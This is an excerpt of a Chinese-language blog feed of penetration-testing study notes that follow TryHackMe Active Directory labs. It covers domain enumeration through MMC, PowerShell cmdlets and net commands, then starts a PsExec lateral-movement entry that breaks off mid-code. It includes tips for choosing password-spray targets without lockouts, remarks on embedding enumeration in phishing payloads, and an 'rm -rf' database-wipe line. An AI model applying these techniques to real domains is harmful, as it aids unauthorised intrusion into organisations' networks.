上：</strong></p><p>Neo4j 数据库文件通常在 <code>C:\Program Files\Neo4j Community\neo4j-data\databases</code> 目录中。删除这个目录下的所有文件和子目录。</p><p><strong>在 Linux 上：</strong></p><p>Neo4j 数据库文件通常在 <code>/var/lib/neo4j/data/databases</code> 目录中。你可以使用以下命令删除该目录下的所有文件和子目录：</p><p>bashCopy Code</p><p><code>sudo rm -rf /var/lib/neo4j/data/databases/*</code></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 枚举AD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AD域枚举信息-Microsoft控制台MMC</title>
      <link href="/2024/09/08/AD%E5%9F%9F%E6%9E%9A%E4%B8%BE%E4%BF%A1%E6%81%AF-Microsoft%E6%8E%A7%E5%88%B6%E5%8F%B0MMC/"/>
      <url>/2024/09/08/AD%E5%9F%9F%E6%9E%9A%E4%B8%BE%E4%BF%A1%E6%81%AF-Microsoft%E6%8E%A7%E5%88%B6%E5%8F%B0MMC/</url>
      
        <content type="html"><![CDATA[<h5 id="Enumeration-through-Microsoft-Management-Console"><a href="#Enumeration-through-Microsoft-Management-Console" class="headerlink" title="Enumeration through Microsoft Management Console"></a>Enumeration through Microsoft Management Console</h5><p>我们将使用 Microsoft 管理控制台 （MMC） 和<a href="https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps">远程服务器管理工具</a> （RSAT） AD 管理单元。如果您使用提供的 Windows VM （THMJMP1），则已为您安装该 VM。但是，如果您使用的是自己的 Windows 计算机，则可以执行以下步骤来安装管理单元：</p><ol><li>Press <strong>Start</strong> 按**“开始**”</li><li>Search <strong>“Apps &amp; Features”</strong> and press enter<br> 搜索**“应用和功能”**，然后按回车键</li><li>Click <strong>Manage Optional Features</strong><br> 单击“<strong>管理可选功能</strong>”</li><li>Click <strong>Add a feature</strong><br> 单击**“添加功能**”</li><li>Search for <strong>“RSAT”</strong><br> 搜索 <strong>“RSAT”</strong></li><li>Select “<strong>RSAT: Active Directory Domain Services and Lightweight Directory Tools”</strong> and click <strong>Install</strong><br> 选择“<strong>RSAT：Active Directory 域服务和轻量级目录工具”</strong>，然后单击“<strong>安装</strong>”</li></ol><p>*只有安装了rsat才可以继续使用MMC<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240907200746.png" alt="image.png"><br>可以看到不是说逆向安装就能安装的rsat 因此可以看到如果我们拿不到本地管理员的权限我们就无法安装rsat 那么此时我们的 cmdlet 以及 mmc 都是无法使用的。</p><p>您可以通过使用 Windows“开始”按钮、搜索“运行”和键入 MMC 来启动 MMC。如果我们只是正常运行 MMC，它将无法工作，因为我们的计算机未加入域，并且我们的本地帐户不能用于对域进行身份验证。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/dd93acc5bf807d120eb083d2250e77ef.png"></p><p>这就是上一个任务的 Runas 窗口发挥作用的地方。在该窗口中，我们可以启动 MMC，这将确保所有 MMC 网络连接都将使用我们注入的 AD 凭据。<br>就相当于说我们使用刚才的<a href="%E5%87%AD%E8%AF%81%E6%B3%A8%E5%85%A5.md">凭证注入</a>的作用，我们打开mmc时候是以凭据身份通过网络进行验证。我们就可以加入域中就可以使用mmc。</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240818155636.png" alt="image.png"><br>此时我们使用了mmc进行操作。进入了mmc，开始配置:<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240907195611.png" alt="image.png"></p><ol><li>Click <strong>File</strong> -&gt; <strong>Add&#x2F;Remove Snap-in</strong><br> 单击**“文件**”-&gt;<strong>“添加&#x2F;删除管理单元</strong>”</li><li>Select and <strong>Add</strong> all three Active Directory Snap-ins<br> 选择并<strong>添加</strong>所有三个 Active Directory 管理单元</li><li>Click through any errors and warnings<br> 点击查看任何错误和警告  </li><li>Right-click on <strong>Active Directory Domains and Trusts</strong> and select <strong>Change Forest</strong><br> 右键单击**“Active Directory 域和信任关系**”，然后选择“<strong>更改林</strong>”</li><li>Enter <em>za.tryhackme.com</em> as the <strong>Root domain</strong> and Click <strong>OK</strong><br> 输入 <em>za.tryhackme.com</em> 作为<strong>根域</strong>，然后单击<strong>确定</strong></li><li>Right-click on <strong>Active Directory Sites and Services</strong> and select <strong>Change Forest</strong><br> 右键单击**“Active Directory 站点和服务”**，然后选择“<strong>更改林</strong>”</li><li>Enter <em>za.tryhackme.com</em> as the <strong>Root domain</strong> and Click OK<br> 输入 <em>za.tryhackme.com</em> 作为<strong>根域</strong>，然后单击确定</li><li>Right-click on <strong>Active Directory Users and Computers</strong> and select <strong>Change Domain</strong><br> 右键单击**“Active Directory 用户和计算机**”，然后选择**“更改域”**</li><li>Enter <em>za.tryhackme.com</em> as the <strong>Domain</strong> and Click <strong>OK</strong><br> 输入 <em>za.tryhackme.com</em> 作为<strong>域</strong>，然后单击<strong>确定</strong></li><li>Right-click on <strong>Active Directory Users and Computers</strong> in the left-hand pane<br>右键单击左侧窗格中的**“Active Directory 用户和计算机**”  </li><li>Click on <strong>View</strong> -&gt; <strong>Advanced Features</strong><br>点击查看 -&gt; 高级功能</li></ol><p>如果到目前为止一切正常，则现在应指向目标域，并针对目标域进行身份验证：现在，我们可以在此处开始列举有关 AD 结构的信息。</p><h4 id="Users-and-Computers-用户和计算机"><a href="#Users-and-Computers-用户和计算机" class="headerlink" title="Users and Computers 用户和计算机"></a>Users and Computers 用户和计算机</h4><p>让我们看一下 Active Directory 结构。对于此任务，我们将重点关注 AD 用户和计算机。展开该管理单元并展开 za 域以查看初始组织单元 （OU） 结构：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/a5fc9efbd6a77ee9ea72a25d7ba13240.png" alt="MMC AD Snap-in"></p><p>让我们看一下 People 目录。在这里，我们看到用户是按照部门 OU 划分的。单击这些 OU 中的每一个都将显示属于该部门的用户。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/993c161b6d86d61bf5ecc31a0ce0fa54.png" alt="MMC AD Snap-in"></p><p>单击这些用户中的任何一个都将允许我们查看他们的所有属性和属性。我们还可以看到他们属于哪些组：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/659127fd61749667192a19e0fb71ad55.png" alt="MMC AD Snap-in"></p><p>我们还可以使用 MMC 在环境中查找主机。如果我们单击“服务器”或“工作站”，将显示已加入域的计算机列表。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/9e353f21616effb4a9cca2f3e86e65ad.png" alt="MMC AD Snap-in"></p><p>如果我们有相关的权限，我们也可以使用MMC直接对AD进行更改，例如更改用户的密码或向特定组添加帐户。尝试使用 MMC 以更好地了解 AD 域结构。利用搜索功能查找对象。</p><p>Benefits 好处</p><p>-<br>GUI 提供了一种出色的方法来全面了解 AD 环境。</p><p>-<br>可以对不同的AD对象进行快速搜索。  </p><ul><li>  它提供了一种直接的方法来查看 AD 对象的特定更新。</li><li>  如果我们有足够的权限，我们可以直接更新现有的 AD 对象或添加新的 AD 对象。</li></ul><p>Drawbacks 缺点</p><p>-<br>GUI 需要对执行它的计算机进行 RDP 访问。</p><p>-<br>    尽管搜索对象的速度很快，但无法收集 AD 范围的属性或属性。</p><p>所以MMC的方式前提是我们能拿到rdp的gui界面才可以。</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 枚举AD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AD域枚举信息-powershell-cmdlet</title>
      <link href="/2024/09/08/AD%E5%9F%9F%E6%9E%9A%E4%B8%BE%E4%BF%A1%E6%81%AF-powershell-cmdlet/"/>
      <url>/2024/09/08/AD%E5%9F%9F%E6%9E%9A%E4%B8%BE%E4%BF%A1%E6%81%AF-powershell-cmdlet/</url>
      
        <content type="html"><![CDATA[<p>安装 Active Directory 远程管理工具（AD-RSAT，Active Directory Remote Server Administration Tools）后，系统会自动安装一组用于管理 Active Directory 的 PowerShell cmdlet。这些 cmdlet 允许你通过 PowerShell 执行各种 Active Directory 相关的管理任务，如用户和计算机管理、组策略、域控制器等。</p><h3 id="常见的-AD-RSAT-cmdlet"><a href="#常见的-AD-RSAT-cmdlet" class="headerlink" title="常见的 AD-RSAT cmdlet"></a>常见的 AD-RSAT cmdlet</h3><p>以下是一些常见的 AD-RSAT cmdlet，通常会在安装了这些工具后可用：</p><ol><li><p><strong>用户和计算机管理</strong>:</p><ul><li><code>Get-ADUser</code>：获取 Active Directory 用户的详细信息。</li><li><code>Set-ADUser</code>：修改 Active Directory 用户的属性。</li><li><code>New-ADUser</code>：创建新的 Active Directory 用户。</li><li><code>Remove-ADUser</code>：删除 Active Directory 用户。</li><li><code>Get-ADComputer</code>：获取 Active Directory 计算机的详细信息。</li><li><code>Set-ADComputer</code>：修改 Active Directory 计算机的属性。</li><li><code>New-ADComputer</code>：创建新的 Active Directory 计算机。</li><li><code>Remove-ADComputer</code>：删除 Active Directory 计算机。</li></ul></li><li><p><strong>组管理</strong>:</p><ul><li><code>Get-ADGroup</code>：获取 Active Directory 组的详细信息。</li><li><code>Set-ADGroup</code>：修改 Active Directory 组的属性。</li><li><code>New-ADGroup</code>：创建新的 Active Directory 组。</li><li><code>Remove-ADGroup</code>：删除 Active Directory 组。</li></ul></li><li><p><strong>域控制器和域管理</strong>:</p><ul><li><code>Get-ADDomainController</code>：获取域控制器的详细信息。</li><li><code>Get-ADDomain</code>：获取 Active Directory 域的详细信息。</li></ul></li><li><p><strong>组策略</strong>:</p><ul><li><code>Get-GPO</code>：获取组策略对象的信息。</li><li><code>New-GPO</code>：创建新的组策略对象。</li><li><code>Set-GPO</code>：修改组策略对象的设置。</li><li><code>Remove-GPO</code>：删除组策略对象。</li></ul></li><li><p><strong>组织单位 (OU) 管理</strong>:</p><ul><li><code>Get-ADOrganizationalUnit</code>：获取 Active Directory 组织单位的详细信息。</li><li><code>New-ADOrganizationalUnit</code>：创建新的 Active Directory 组织单位。</li><li><code>Remove-ADOrganizationalUnit</code>：删除 Active Directory 组织单位。</li></ul></li></ol><h3 id="如何确认安装的-cmdlet"><a href="#如何确认安装的-cmdlet" class="headerlink" title="如何确认安装的 cmdlet"></a>如何确认安装的 cmdlet</h3><p>要查看安装的 AD-RSAT cmdlet，你可以在 PowerShell 中运行以下命令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Command</span> <span class="literal">-Module</span> ActiveDirectory</span><br></pre></td></tr></table></figure><p>这个命令会列出所有来自 <code>ActiveDirectory</code> 模块的 cmdlet。如果你发现没有安装某些 cmdlet，可能需要确认 RSAT 工具是否正确安装或是否需要更新。</p><h3 id="安装和启用-AD-RSAT"><a href="#安装和启用-AD-RSAT" class="headerlink" title="安装和启用 AD-RSAT"></a>安装和启用 AD-RSAT</h3><p>在 Windows 10 及更高版本中，可以通过以下步骤安装和启用 AD-RSAT 工具：</p><ol><li><strong>打开设置</strong>: 进入 <code>设置</code> &gt; <code>应用</code> &gt; <code>可选功能</code>。</li><li><strong>添加功能</strong>: 点击 <code>添加功能</code>，然后搜索 <code>RSAT</code>。</li><li><strong>安装所需组件</strong>: 勾选相关的 RSAT 组件（如 Active Directory 域服务和 Lightweight Directory Tools），然后点击 <code>安装</code>。</li></ol><p>PowerShell 是命令提示符的升级版。Microsoft 于 2006 年首次发布。虽然 PowerShell 具有命令提示符提供的所有标准功能，但它也提供对 cmdlet（发音为 command-lets）的访问，这些 cmdlet 是用于执行特定功能的 .NET 类。虽然我们可以像 <a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">PowerView</a> 的创建者那样编写自己的 cmdlet，但我们已经可以使用内置的 cmdlet 走得很远。</p><p>由于我们在任务 3 中安装了 AD-RSAT 工具，因此它会自动为我们安装关联的 cmdlet。已安装 50+ 个 cmdlet。我们将查看其中的一些，但请参阅 <a href="https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps">此列表以获取 cmdlet 的完整列表。</a></p><p>**由于剧情模拟需要我们今天需要模拟我们已经拿到了一个服务器的权限。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh za.tryhackme.com\\&lt;AD Username&gt;@thmjmp1.za.tryhackme.com</span><br></pre></td></tr></table></figure><h6 id="验证cmdlet"><a href="#验证cmdlet" class="headerlink" title="验证cmdlet"></a>验证cmdlet</h6><p><a href="powershelll%E6%9E%9A%E4%B8%BE.md#%E5%A6%82%E4%BD%95%E7%A1%AE%E8%AE%A4%E5%AE%89%E8%A3%85%E7%9A%84%20cmdlet">如何确认安装的 cmdlet</a><br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240830201932.png" alt="image.png"></p><p>可以看到根据结果我们已经找到相关的cmdlet证明我们此时这台服务器上已经安装了一个rsat 之后就带上了cmdlet </p><h5 id="Users-用户"><a href="#Users-用户" class="headerlink" title="Users 用户"></a>Users 用户</h5><p>我们可以使用<code>Get-ADUser</code> cmdlet 来枚举AD用户：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADUser</span> <span class="literal">-Identity</span> beth.nolan <span class="literal">-Server</span> za.tryhackme.com <span class="literal">-Properties</span> *</span><br></pre></td></tr></table></figure><p>这是一个 PowerShell 命令，用于从 Active Directory 中获取用户信息。<code>-Identity</code> 用于指定用户，<code>-Server</code> 指定域控制器，<code>-Properties *</code> 表示获取所有属性<br>这些参数用于以下用途：</p><ul><li>-Identity<br>  -Identity - 我们正在枚举的帐户名</li><li>-Properties <ul><li>属性 - 将显示与帐户关联的哪些属性，* 将显示所有属性</li></ul></li><li>-Server<br>  -Server - 由于我们没有加入域，因此我们必须使用此参数将其指向我们的域控制器<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240830202852.png" alt="image.png"></li></ul><p>对于大多数这些 cmdlet，我们还可以使用<code>-Filter</code>参数来对枚举进行更多控制，并使用<code>Format-Table</code> cmdlet 整齐地显示结果，如下所示：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> <span class="string">&#x27;Name -like &quot;*stevens&quot;&#x27;</span> <span class="literal">-Server</span> za.tryhackme.com | <span class="built_in">Format-Table</span> Name,SamAccountName <span class="literal">-A</span></span><br></pre></td></tr></table></figure><ul><li><p><strong><code>Get-ADUser -Filter &#39;Name -like &quot;*stevens&quot;&#39; -Server za.tryhackme.com</code></strong>:</p><ul><li><code>Get-ADUser</code>：获取用户账户的 cmdlet。</li><li><code>-Filter &#39;Name -like &quot;*stevens&quot;&#39;</code>：使用筛选器来查找名称中包含 “stevens” 的用户。<code>*</code> 是通配符，表示在 “stevens” 前面可以有任何字符。</li><li><code>-Server za.tryhackme.com</code>：指定 Active Directory 服务器（在这里是 <code>za.tryhackme.com</code>）来执行查询。</li></ul></li><li><p><strong><code>| Format-Table Name,SamAccountName -A</code></strong>:</p><ul><li><code>|</code>：管道符号，用于将前面的命令结果传递给下一个命令。</li><li><code>Format-Table</code>：将结果格式化为表格形式。</li><li><code>Name,SamAccountName</code>：指定要在表格中显示的属性，<code>Name</code> 是用户的全名，<code>SamAccountName</code> 是用户的登录名（SAM 帐户名）。</li><li><code>-A</code>（或 <code>-AutoSize</code>）：自动调整列宽，以便更好地显示数据。</li></ul></li></ul><h5 id="Groups-团体"><a href="#Groups-团体" class="headerlink" title="Groups 团体"></a>Groups 团体</h5><p>我们可以使用<code>Get-ADGroup</code> cmdlet 来枚举AD组：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADGroup</span> <span class="literal">-Identity</span> Administrators <span class="literal">-Server</span> za.tryhackme.com <span class="literal">-Properties</span> *</span><br></pre></td></tr></table></figure><p>还可以使用<code>Get-ADGroupMember</code> cmdlet 枚举组成员身份：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADGroupMember</span> <span class="literal">-Identity</span> Administrators <span class="literal">-Server</span> za.tryhackme.com <span class="literal">-Properties</span> *</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240830203845.png" alt="image.png"></p><h5 id="AD-Objects"><a href="#AD-Objects" class="headerlink" title="AD Objects"></a>AD Objects</h5><p>可以使用<code>Get-ADObject</code> cmdlet 对任何AD对象执行更通用的搜索。例如，如果我们正在查找在特定日期之后更改的所有AD对象：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ChangeDate</span> = <span class="built_in">New-Object</span> DateTime(<span class="number">2022</span>, <span class="number">02</span>, <span class="number">28</span>, <span class="number">12</span>, <span class="number">00</span>, <span class="number">00</span>)</span><br><span class="line"><span class="built_in">Get-ADObject</span> <span class="literal">-Filter</span> <span class="string">&#x27;whenChanged -gt $ChangeDate&#x27;</span> <span class="literal">-includeDeletedObjects</span> <span class="literal">-Server</span> za.tryhackme.com</span><br></pre></td></tr></table></figure><ul><li><strong><code>-Filter &#39;whenChanged -gt $ChangeDate&#39;</code></strong>：过滤器，用于找到 <code>whenChanged</code> 属性（最后修改时间）晚于 <code>$ChangeDate</code> 的对象。</li><li><strong><code>-includeDeletedObjects</code></strong>：包括已删除的对象在内。</li><li><strong><code>-Server za.tryhackme.com</code></strong>：指定 Active Directory 服务器。</li></ul><p>因此在我看来这个AD这个对象的更改的查看更像是一个相关的一个所有域中的更改状态，就是这些组或者账户或者计算机什么时候被做了什么操作。<br>但是我们可以看到我们都是用filter 进行了过滤。  都是根据据get-adobject 这条命令之后得到的相关属性的某一个特性进行独特的过滤。<br>***例如，如果我们想在不锁定帐户的情况下执行密码喷射攻击，我们可以使用它来枚举 badPwdCount 大于 0 的帐户，以避免这些帐户参与我们的攻击：</p><p>因为<code>badPwdCount</code> 是 Active Directory 用户对象的一个属性，表示用户帐户尝试登录时输入错误密码的次数。如果达到或超过设定的阈值，帐户可能会被锁定。记录的是输入错误的次数。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADObject</span> <span class="literal">-Filter</span> <span class="string">&#x27;badPwdCount -gt 0&#x27;</span> <span class="literal">-Server</span> za.tryhackme.com </span><br></pre></td></tr></table></figure><p>找到相关输入次数的账户将其排除我们的密码喷射的范围账户之内.</p><h5 id="Domains-域名"><a href="#Domains-域名" class="headerlink" title="Domains 域名"></a>Domains 域名</h5><p>我们可以使用<code>Get-ADDomain</code>来检索有关特定域的附加信息：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADDomain</span> <span class="literal">-Server</span> za.tryhackme.com</span><br></pre></td></tr></table></figure><h5 id="更改AD对象"><a href="#更改AD对象" class="headerlink" title="更改AD对象"></a>更改AD对象</h5><p>AD -RSAT cmdlet 的优点在于，有些 cmdlet 甚至允许您创建新的或更改现有的AD对象。然而，我们对该网络的关注点是枚举。创建新对象或更改现有对象将被视为AD开发，稍后将在AD模块中介绍。<br>但是，我们将通过使用<code>Set-ADAccountPassword</code> cmdlet 强制更改AD用户的密码来展示此示例：<br>相当于我感觉就是使用命令行去进去对于ad的一些更改工作,直接去修改内网相关配置权限.</p><p>这个 PowerShell 命令用于在 Active Directory 中更改用户 <code>gordon.stevens</code> 的密码。详细解释如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ADAccountPassword</span> <span class="literal">-Identity</span> gordon.stevens <span class="literal">-Server</span> za.tryhackme.com <span class="literal">-OldPassword</span> (<span class="built_in">ConvertTo-SecureString</span> <span class="literal">-AsPlaintext</span> <span class="string">&quot;old&quot;</span> <span class="literal">-force</span>) <span class="literal">-NewPassword</span> (<span class="built_in">ConvertTo-SecureString</span> <span class="literal">-AsPlainText</span> <span class="string">&quot;new&quot;</span> <span class="literal">-Force</span>)</span><br></pre></td></tr></table></figure><ul><li><strong><code>Set-ADAccountPassword</code></strong>：用于更改用户账户密码的 cmdlet。</li><li><strong><code>-Identity gordon.stevens</code></strong>：指定要更改密码的用户账户（在这里是 <code>gordon.stevens</code>）。</li><li><strong><code>-Server za.tryhackme.com</code></strong>：指定 Active Directory 服务器来执行操作。</li><li><strong><code>-OldPassword (ConvertTo-SecureString -AsPlaintext &quot;old&quot; -Force)</code></strong>：指定当前的旧密码。<code>ConvertTo-SecureString</code> 将密码字符串 <code>&quot;old&quot;</code> 转换为安全字符串格式，<code>-Force</code> 允许将明文密码转换为安全字符串。</li><li><strong><code>-NewPassword (ConvertTo-SecureString -AsPlainText &quot;new&quot; -Force)</code></strong>：指定新密码。类似地，将 <code>&quot;new&quot;</code> 转换为安全字符串格式。</li></ul><p>此命令会将用户 <code>gordon.stevens</code> 的密码从 <code>&quot;old&quot;</code> 更改为 <code>&quot;new&quot;</code>，通过指定的 Active Directory 服务器来执行这一操作。</p><p>**Benefits 好处  </p><p>-<br>PowerShell cmdlet 可以枚举比命令提示符中的 net 命令更多的信息。</p><ul><li>  我们可以指定服务器和域来使用未加入域的计算机上的 runas 执行这些命令。  </li><li>  我们可以创建自己的 cmdlet 来枚举特定信息。</li><li>  我们可以使用AD -RSAT cmdlet 直接更改AD对象，例如重置密码或将用户添加到特定组。</li></ul><p>**Drawbacks 缺点</p><p>-<br>与命令提示符相比，蓝队通常更多地监控PowerShell 。</p><p>-<br>    我们必须安装 AD-RSAT 工具或使用其他可能可检测的脚本进行PowerShell枚举。</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 枚举AD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AD域枚举信息-命令枚举</title>
      <link href="/2024/09/08/AD%E5%9F%9F%E6%9E%9A%E4%B8%BE%E4%BF%A1%E6%81%AF-%E5%91%BD%E4%BB%A4%E6%9E%9A%E4%B8%BE/"/>
      <url>/2024/09/08/AD%E5%9F%9F%E6%9E%9A%E4%B8%BE%E4%BF%A1%E6%81%AF-%E5%91%BD%E4%BB%A4%E6%9E%9A%E4%B8%BE/</url>
      
        <content type="html"><![CDATA[<p>有时，您只需要执行快速而肮脏的AD查找，而命令提示符会为您提供支持。当您可能无法访问系统的 RDP、防御者正在监控 PowerShell 的使用以及您需要通过远程访问木马 （RAT） 执行 AD 枚举时，可靠可靠的 CMD 非常方便。在网络钓鱼有效负载中嵌入几个简单的 AD 枚举命令甚至会有所帮助，以帮助您获取可以帮助您进行最终攻击的重要信息。</p><p>CMD 有一个内置命令，我们可以使用它来枚举有关 AD 的信息，即 <code>net</code>。<code>net</code> 命令是一个方便的工具，用于枚举有关本地系统和 AD 的信息。我们将看看我们可以从这个位置列举出一些有趣的事情，但这不是一个详尽的列表CMD 有一个内置命令，我们可以使用它来枚举有关 AD 的信息，即 <code>net</code>。<code>net</code> 命令是一个方便的工具，用于枚举有关本地系统和 AD 的信息。我们将看看我们可以从这个位置列举出一些有趣的事情，但这不是一个详尽的列表。</p><h4 id="Users-用户"><a href="#Users-用户" class="headerlink" title="Users 用户"></a>Users 用户</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure><p>这将为我们返回所有 AD 用户，并有助于确定域的大小以进行进一步的攻击。我们还可以使用此子选项来枚举有关单个用户帐户的更多详细信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user zoe.marshall /domain</span><br></pre></td></tr></table></figure><p>**注意：如果用户只是少数 AD 组的一部分，则此命令将能够向我们显示组成员身份。但是，通常，在超过十个组成员身份之后，该命令将无法列出所有成员身份。</p><h4 id="Groups-组"><a href="#Groups-组" class="headerlink" title="Groups 组"></a>Groups 组</h4><p>我们可以使用 <code>net</code> 命令通过使用 <code>group</code> 子选项来枚举域的组：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group /domain</span><br></pre></td></tr></table></figure><p>这些信息可以帮助我们找到目标执行的特定目标群体。我们还可以通过在同一命令中指定组来枚举更多详细信息，例如组的成员身份：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Tier 1 Admins&quot; /domain</span><br></pre></td></tr></table></figure><h4 id="Password-Policy-密码策略"><a href="#Password-Policy-密码策略" class="headerlink" title="Password Policy 密码策略"></a>Password Policy 密码策略</h4><p>可以使用 <code>net</code> 命令通过使用 <code>accounts</code> 子选项来枚举域的密码策略：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net accounts /domain</span><br></pre></td></tr></table></figure><ul><li>  保留的密码历史记录的长度。这意味着用户必须提供多少个唯一密码才能重复使用旧密码。</li><li>  错误密码尝试的锁定阈值以及帐户将被锁定的时间长度。</li><li>  密码的最小长度。</li><li>  允许密码达到的最长期限，指示是否必须定期轮换密码。</li></ul><p>如果我们想对我们现在列举的其他用户帐户进行额外的密码喷洒攻击，这些信息可以使我们受益。它可以帮助我们更好地猜测在攻击中应该使用哪些单一密码，以及在冒着锁定帐户的风险之前我们可以运行多少次攻击。但是，应该注意的是，如果我们执行盲密码喷射攻击，我们无论如何都可能会锁定帐户，因为我们没有检查以确定该特定帐户在被锁定之前还剩下多少次尝试。</p><p><a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/net-commands-on-operating-systems">net相关命令</a></p><h3 id="Benefits-好处"><a href="#Benefits-好处" class="headerlink" title="Benefits 好处"></a>Benefits 好处</h3><ul><li>  不需要额外的工具或外部工具，这些简单的命令通常不会受到 Blue 团队的监控。</li><li>  我们不需要 GUI 来执行此枚举。</li><li>.<br>  VBScript 和其他通常用于网络钓鱼有效负载的巨集语言本身支持这些命令，因此在制作更具体的有效负载之前，它们可用于枚举有关 AD 域的初始信息。</li></ul><p>Drawbacks 缺点</p><p>-<br><code>net</code> 命令必须从已加入域的计算机上执行。如果计算机未加入域，它将默认为 WORKGROUP 域。</p><p>-<br>    <code>net</code> 命令可能无法显示所有信息。例如，如果用户是 10 个以上组的成员，则并非所有这些组都会显示在输出中。</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 枚举AD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>横向移动-远程创建进程</title>
      <link href="/2024/09/08/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8B/"/>
      <url>/2024/09/08/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="Psexec-执行程序"><a href="#Psexec-执行程序" class="headerlink" title="Psexec 执行程序"></a>Psexec 执行程序</h2><ul><li><strong>Ports:</strong> 445&#x2F;TCP (SMB)<br>  <strong>端口：</strong> 445&#x2F; TCP （ SMB ）</li><li><strong>Required Group Memberships:</strong> Administrators<br>  **所需的组成员身份：管理员</li></ul><p>多年来，Psexec 一直是需要远程执行进程时的首选方法。它允许管理员用户在他有权访问的任何 PC 上远程运行命令。 Psexec 是众多 Sysinternals 工具之一，可以<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">在此处</a>下载。</p><h5 id="psexec-的工作方式如下："><a href="#psexec-的工作方式如下：" class="headerlink" title="psexec 的工作方式如下："></a>psexec 的工作方式如下：</h5><ol><li>Connect to Admin$ share and upload a service binary. Psexec uses psexesvc.exe as the name.<br> 连接到 Admin$ 共享并上传服务二进制文件。 Psexec 使用 psexesvc.exe 作为名称。</li><li>Connect to the service control manager to create and run a service named PSEXESVC and associate the service binary with <code>C:\Windows\psexesvc.exe</code>.<br> 连接到服务控制管理器以创建并运行名为 PSEXESVC 的服务，并将服务二进制文件与<code>C:\Windows\psexesvc.exe</code>关联。</li><li>Create some named pipes to handle stdin&#x2F;stdout&#x2F;stderr.<br> 创建一些命名管道来处理 stdin&#x2F;stdout&#x2F;stderr。</li></ol><p>其实工作方式很明确了,就是通过一些通道或者一些东西来传输对应的命令。但是我们需要对面的管理员权限因此我们刚才的总基调就可以看到，我们只能使用域管理员和一些默认管理员<br>进行一些管道的传输。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a488102fe0da47a3667961400cf298d8.png"></p><p>要运行 psexec，我们只需提供远程主机所需的管理员凭据以及我们要运行的命令（为方便起见， <code>psexec64.exe</code>可在 THMJMP2 的<code>C:\tools</code>下找到）：<br>只能对应的是管理员</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 